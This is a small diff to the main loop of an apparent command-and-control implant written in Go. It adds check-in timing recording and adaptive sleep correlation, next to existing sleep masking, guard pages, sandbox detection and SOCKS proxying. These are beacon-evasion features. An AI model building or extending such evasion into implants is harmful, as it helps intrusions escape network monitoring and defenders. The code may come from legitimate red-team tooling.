@@ -184,6 +184,11 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				}
 			}
 
+			// Record check-in timing for network correlation analysis
+			if sleepCorrelator != nil {
+				sleepCorrelator.RecordCheckIn()
+			}
+
 			// Drain any pending outbound SOCKS data to include in this poll
 			outboundSocks := socksManager.DrainOutbound()
 
@@ -254,9 +259,9 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 
 			// Sleep before next iteration — with optional sleep mask, guard pages, and sandbox detection
 			sleepTime := commands.CalculateAdaptiveSleep(agent.SleepInterval, agent.Jitter, agent.JitterProfile)
-			// Apply network correlation if enough samples exist
+			// Adapt sleep based on observed check-in interval patterns
 			if sleepCorrelator != nil {
-				sleepTime = sleepCorrelator.CorrelatedSleep(sleepTime)
+				sleepTime = sleepCorrelator.AdaptSleep(sleepTime)
 			}
 			var vault *sleepVault
 			var guard *guardedPages
